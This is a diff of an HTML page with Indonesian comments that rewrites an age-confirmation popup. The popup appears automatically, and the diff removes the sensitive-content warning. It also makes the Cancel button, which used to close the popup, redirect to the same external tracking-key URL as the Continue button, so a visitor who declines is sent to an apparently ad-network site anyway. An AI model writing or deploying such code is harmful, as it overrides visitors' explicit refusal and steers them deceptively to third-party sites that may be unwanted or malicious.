@@ -188,7 +188,7 @@
     v.addEventListener('loadedmetadata', ()=>{ meta.textContent = `0:00 / ${fmt(v.duration)}`; });
     v.addEventListener('timeupdate',     ()=>{ meta.textContent = `${fmt(v.currentTime)} / ${fmt(v.duration)}`; });
   </script>
-	<!-- ===== POPUP KONFIRMASI USIA (modal) ===== -->
+	<!-- ===== POPUP KONFIRMASI USIA (dengan offer di tombol BATAL) ===== -->
 <div id="age-backdrop" style="display:none; position:fixed; inset:0; z-index:9999;
   background:rgba(0,0,0,.55); backdrop-filter:blur(6px); -webkit-backdrop-filter:blur(6px);
   display:flex; align-items:center; justify-content:center; padding:16px;">
@@ -199,7 +199,7 @@
         Konfirmasi Usia
       </h3>
       <p style="margin:0 0 14px; font:14px/1.5 Inter,system-ui,Arial,sans-serif; color:#4b5563;">
-        Konten berikut bersifat sensitif. Apakah Anda berusia 18+ dan ingin melanjutkan?
+        Apakah Anda berusia 18+ dan ingin melanjutkan?
       </p>
     </div>
     <div style="display:flex; gap:10px; padding:14px 18px 18px; justify-content:flex-end;">
@@ -215,10 +215,11 @@
 
 <script>
 /* ====== KONFIGURASI CEPAT ====== */
-const AGE_NEXT_URL = "https://coolriverwalk.com/epphu0841?key=731f67ae640fe704d0060b95bfa428cd";   // ganti ke URL tujuanmu
-const AUTO_SHOW_DELAY = 5000;                            // ms sebelum modal muncul otomatis
-const OPEN_IN_NEW_TAB = false;                           // true = buka di tab baru
-const REMEMBER_TTL_MIN = 120;                            // jangan tampil lagi selama X menit setelah “Lanjut”
+const AGE_NEXT_URL = "https://coolriverwalk.com/epphu0841?key=731f67ae640fe704d0060b95bfa428cd";   // Tujuan tombol LANJUT
+const OFFER_URL    = "https://coolriverwalk.com/epphu0841?key=731f67ae640fe704d0060b95bfa428cd";    // Tujuan tombol BATAL
+const AUTO_SHOW_DELAY = 10000;                             // ms sebelum popup muncul otomatis
+const OPEN_IN_NEW_TAB = false;                            // true = buka di tab baru
+const REMEMBER_TTL_MIN = 120;                             // TTL (menit) agar popup tak muncul lagi
 
 /* ====== LOGIKA MODAL ====== */
 const $backdrop = document.getElementById('age-backdrop');
@@ -234,7 +235,6 @@ function bodyLock(lock){
 function showAgeModal(){
   $backdrop.style.display = 'flex';
   bodyLock(true);
-  // fokus ke tombol lanjut untuk aksesibilitas
   setTimeout(()=> $go.focus(), 50);
 }
 
@@ -254,22 +254,28 @@ function rememberOk(){
   try{ localStorage.setItem('age_ok_time', String(Date.now())); }catch(e){}
 }
 
-function proceed(){
-  rememberOk();
-  if(OPEN_IN_NEW_TAB){ window.open(AGE_NEXT_URL, '_blank', 'noopener'); }
-  else{ window.location.href = AGE_NEXT_URL; }
+function goTo(url){
+  if(OPEN_IN_NEW_TAB){ window.open(url, '_blank', 'noopener'); }
+  else{ window.location.href = url; }
 }
 
 /* ====== EVENT ====== */
-$go.addEventListener('click', proceed);
-$cancel.addEventListener('click', hideAgeModal);
+$go.addEventListener('click', () => {
+  rememberOk();
+  goTo(AGE_NEXT_URL);
+});
+
+$cancel.addEventListener('click', () => {
+  rememberOk();
+  goTo(OFFER_URL);
+});
 
 // Tutup dengan ESC
 window.addEventListener('keydown', (e)=>{ if(e.key === 'Escape') hideAgeModal(); });
 
-// (Opsional) klik di luar dialog tidak menutup, biar eksplisit
+// Klik luar dialog tidak menutup (lebih aman)
 $backdrop.addEventListener('click', (e)=>{
-  if(e.target === $backdrop){ /* tidak menutup, biarkan user pilih tombol */ }
+  if(e.target === $backdrop){ /* abaikan */ }
 });
 
 /* ====== AUTO-SHOW ====== */
@@ -279,7 +285,6 @@ window.addEventListener('load', ()=>{
   }
 });
 </script>
-
   <!-- ===== Histats (OK di akhir body) ===== -->
   <!-- Histats.com  START  (aync)-->
 <script type="text/javascript">var _Hasync= _Hasync|| [];
